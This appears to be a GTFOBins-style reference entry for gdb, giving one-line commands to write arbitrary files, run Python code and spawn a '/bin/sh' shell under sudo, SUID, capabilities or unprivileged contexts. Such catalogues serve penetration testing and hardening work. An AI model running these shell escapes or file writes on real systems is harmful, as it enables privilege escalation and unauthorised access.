---
type: gtfobin
name: gdb
platform: Unix
functions: [file-write, inherit, shell]
tags: [gtfobin, unix, lotl]
---

# gdb

## file-write

```bash
gdb -nx -ex 'dump value /path/to/output-file "DATA"' -ex quit
```
**Contexts:** sudo, suid, unprivileged

## inherit

```bash
gdb -nx -ex 'python ...' -ex quit
```
_This allows to run Python code (`...`)._
**Contexts:** sudo, suid, unprivileged

## shell

```bash
gdb -nx -ex '!/bin/sh' -ex quit
```
**Contexts:** capabilities, sudo, suid, unprivileged
